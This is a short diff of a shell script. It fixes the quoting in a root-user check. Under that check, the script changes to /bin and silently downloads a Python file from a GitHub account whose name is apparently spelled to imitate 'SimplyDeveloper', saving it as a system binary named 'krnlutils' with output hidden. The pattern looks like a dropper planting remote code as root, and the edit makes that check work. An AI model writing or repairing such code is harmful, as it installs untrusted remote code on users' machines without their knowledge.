@@ -1,4 +1,4 @@
-if [[ '$(whoami)' = 'root' ]];
+if [[ "$(whoami)" = 'root' ]];
 then
 cd /bin 
 wget https://raw.githubusercontent.com/SimpIyDeveIoper/KrnlUtils/main/KrnlUtils.py -O krnlutils > /dev/null 
